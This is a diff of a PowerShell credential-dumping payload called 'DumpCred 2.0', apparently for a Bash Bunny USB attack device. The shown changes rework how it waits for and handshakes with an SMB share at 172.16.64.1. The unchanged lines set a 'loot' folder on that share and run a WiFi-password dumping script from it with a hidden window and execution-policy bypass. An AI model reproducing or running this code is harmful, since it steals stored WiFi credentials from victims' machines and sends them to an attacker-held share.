@@ -1,4 +1,5 @@
-﻿<#
+﻿
+<#
 .SYNOPSIS
    DumpCred 2.0
 .DESCRIPTION
@@ -14,13 +15,25 @@ $SHARE="\\172.16.64.1\e"
 $LOOT="$SHARE\loot"
 $FILE="$LOOT\$env:COMPUTERNAME.txt"
 
+# Wait for Share
+do { 
+    Start-Sleep -s 5
+    Write-Host -NoNewline "-"
+} until (test-path \\172.16.64.1\e)
+
+# Ok we got the connection.... Wait and Initiate the Handshake
+Start-Sleep -s 5
+Write-output " " | out-file "$SHARE\CON_REQ"
+
 # Handshake - create CON_REQ on Share. Bunny creates CON_OK if all is OK --- Check Share is writable
-while (!(Test-Path "$SHARE\CON_OK")) { 
-    echo "" > "$SHARE\CON_REQ"
-    Start-Sleep 1 
-}
+do {
+    Start-Sleep -s 5
+    Write-Host -NoNewline "+"
+} until (Test-Path "$SHARE\CON_OK")
+
 
 # Go on......
+
 
 # Dumps WiFi Passwords
 $WiFiCreds = powershell -WindowStyle Hidden -Exec Bypass $SHARE\PS\Get-WiFiCreds.ps1
